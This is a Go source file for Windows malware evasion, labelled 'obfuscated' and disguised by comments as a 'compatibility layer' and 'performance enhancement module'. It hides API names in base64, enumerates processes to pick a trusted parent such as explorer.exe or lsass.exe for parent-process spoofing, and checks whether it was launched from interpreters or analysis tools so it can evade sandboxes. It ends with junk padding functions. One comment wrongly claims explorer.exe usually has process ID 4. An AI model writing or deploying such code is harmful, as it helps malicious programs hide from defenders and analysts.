// OBFUSCATED
// Windows compatibility layer
// Performance enhancement module
package ppid

import (
	"encoding/base64"
	"syscall"
	"unsafe"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

var (
	kernel32                 = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
	ntdll                    = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
	procOpenProcess          = kernel32.NewProc(d("T3BlblByb2Nlc3M="))
	procCreateToolhelp32     = kernel32.NewProc(d("Q3JlYXRlVG9vbGhlbHAzMlNuYXBzaG90"))             // CreateToolhelp32Snapshot
	procProcess32First       = kernel32.NewProc(d("UHJvY2VzczMyRmlyc3Q="))                         // Process32First
	procProcess32Next        = kernel32.NewProc(d("UHJvY2VzczMyTmV4dA=="))                         // Process32Next
	procUpdateProcThread     = kernel32.NewProc(d("VXBkYXRlUHJvY1RocmVhZEF0dHJpYnV0ZQ=="))         // UpdateProcThreadAttribute
	procInitializeProcThread = kernel32.NewProc(d("SW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0")) // InitializeProcThreadAttributeList
)

const (
	PROCESS_ALL_ACCESS                   = 0x1F0FFF
	TH32CS_SNAPPROCESS                   = 0x00000002
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
)

type PROCESSENTRY32 struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [260]byte
}

// FindProcessByName finds a process PID by its executable name
func FindProcessByName(processName string) uint32 {
	hSnapshot, _, _ := procCreateToolhelp32.Call(TH32CS_SNAPPROCESS, 0)
	if hSnapshot == 0 {
		return 0
	}
	defer syscall.CloseHandle(syscall.Handle(hSnapshot))

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get first process
	ret, _, _ := procProcess32First.Call(hSnapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return 0
	}

	// Iterate through processes
	for {
		exeName := syscall.UTF16ToString((*[260]uint16)(unsafe.Pointer(&pe32.ExeFile))[:])
		if exeName == processName {
			return pe32.ProcessID
		}

		ret, _, _ := procProcess32Next.Call(hSnapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0
}

// SpoofParentProcess attempts to make the process appear as a child of a legitimate process
func SpoofParentProcess() uint32 {
	// Target legitimate parent processes
	legitimateParents := []string{
		"explorer.exe", // Windows Explorer (most common)
		"svchost.exe",  // System service host
		"services.exe", // Service Control Manager
		"lsass.exe",    // Local Security Authority
		"winlogon.exe", // Windows Logon Process
		"csrss.exe",    // Client/Server Runtime
	}

	// Try to find a legitimate parent
	for _, parent := range legitimateParents {
		pid := FindProcessByName(parent)
		if pid != 0 {
			return pid
		}
	}

	// Fallback to explorer.exe PID (usually process ID 4 or close)
	return FindProcessByName("explorer.exe")
}

// GetCurrentProcessPPID returns the current process's parent PID
func GetCurrentProcessPPID() uint32 {
	currentPID := uint32(syscall.Getpid())

	hSnapshot, _, _ := procCreateToolhelp32.Call(TH32CS_SNAPPROCESS, 0)
	if hSnapshot == 0 {
		return 0
	}
	defer syscall.CloseHandle(syscall.Handle(hSnapshot))

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	ret, _, _ := procProcess32First.Call(hSnapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return 0
	}

	for {
		if pe32.ProcessID == currentPID {
			return pe32.ParentProcessID
		}

		ret, _, _ := procProcess32Next.Call(hSnapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0
}

// CheckIfParentIsSuspicious checks if current parent process is suspicious
func CheckIfParentIsSuspicious() bool {
	ppid := GetCurrentProcessPPID()
	if ppid == 0 {
		return true // Can't determine = suspicious
	}

	// Get parent process name
	hSnapshot, _, _ := procCreateToolhelp32.Call(TH32CS_SNAPPROCESS, 0)
	if hSnapshot == 0 {
		return true
	}
	defer syscall.CloseHandle(syscall.Handle(hSnapshot))

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	ret, _, _ := procProcess32First.Call(hSnapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return true
	}

	for {
		if pe32.ProcessID == ppid {
			exeName := syscall.UTF16ToString((*[260]uint16)(unsafe.Pointer(&pe32.ExeFile))[:])

			// Suspicious parents (analysis tools, sandboxes)
			suspiciousParents := []string{
				"cmd.exe",        // Command prompt (suspicious for GUI apps)
				"powershell.exe", // PowerShell
				"python.exe",     // Python interpreter
				"perl.exe",       // Perl
				"ruby.exe",       // Ruby
				"javaw.exe",      // Java
				"wscript.exe",    // Windows Script Host
				"cscript.exe",    // Command Script Host
				"mshta.exe",      // HTML Application Host
				"regsvr32.exe",   // Register Server
			}

			for _, suspicious := range suspiciousParents {
				if exeName == suspicious {
					return true
				}
			}

			return false
		}

		ret, _, _ := procProcess32Next.Call(hSnapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return true
}



// Obfuscation padding
func obf_28665() {
    _ = 6512
    var _ = "bDnfoNc5ZThrODxeMXRpSiMDMVIdTRn2UWAaJfisfpSkCgri7o"
}


// Obfuscation padding
func obf_87129() {
    _ = 7643
    var _ = "6jEbOeXFg0ZrTEX9YdcSg60vuCpNzHXtSPCUPl6tRXqhVQ9s4i"
}


// Obfuscation padding
func obf_60443() {
    _ = 5850
    var _ = "wbeAI4IuiBNiJOamKdZHvfddSMRL71TXXdFCYCvTuys6NIPIvY"
}


// Obfuscation padding
func obf_24874() {
    _ = 3671
    var _ = "hGjzh7WfxaOzik9B6PKXJIXl6zpBJS8F8amMHpNXpk9LQPIzk1"
}


// Obfuscation padding
func obf_43902() {
    _ = 9016
    var _ = "imTjbQ2xrDGPRhmm5ILbA3jSG1PWTo30mjlmf5Dfq12HCBsmWX"
}
